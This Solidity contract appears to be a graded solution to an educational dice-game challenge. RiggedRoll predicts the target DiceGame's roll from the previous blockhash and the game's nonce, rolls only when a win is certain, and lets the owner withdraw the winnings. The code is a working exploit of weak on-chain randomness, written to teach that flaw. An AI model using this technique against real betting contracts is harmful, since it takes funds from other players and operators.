pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        payable(_addr).transfer(_amount);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Insufficient balance");

        // Predict the roll outcome
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 predictedRoll = uint256(hash) % 16;

        console.log("Previous Hash");
        console.logBytes32(prevHash);
        console.log("Hash");
        console.logBytes32(hash);
        console.log("Predicted Roll:", predictedRoll);

        
        require(predictedRoll <= 5, "the roll should be 5 or less" );

        diceGame.rollTheDice{value: 0.002 ether}();

        //// Check if it's a winning roll (0 to 5 are winning numbers)
        //if (predictedRoll <= 5) {
        //    // It's a winning roll, so let's actually roll the dice
        //    diceGame.rollTheDice{value: 0.002 ether}();
        //}
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
